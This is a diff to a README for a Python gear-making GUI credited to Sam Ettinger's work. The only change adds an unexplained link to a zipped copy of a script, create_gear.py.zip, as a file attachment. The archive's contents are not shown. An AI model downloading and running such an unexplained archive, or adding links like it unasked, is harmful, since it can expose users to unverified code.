@@ -10,6 +10,9 @@ This is a gear maker (with gui!) based on the video ["How to make Organically-Sh
 Credit to Sam Ettinger for inspiring me to make this pygear GUI! For more info on Sam's work, here's a link to non-GUI versions: 
 https://www.settinger.net/projects.php?project=gears 
 
+[create_gear.py.zip](https://github.com/user-attachments/files/24424404/create_gear.py.zip)
+
+
 ## Dependencies
 
 Written in Python 3.12.7. Requires numpy, tkinter and PIL (pillow). 
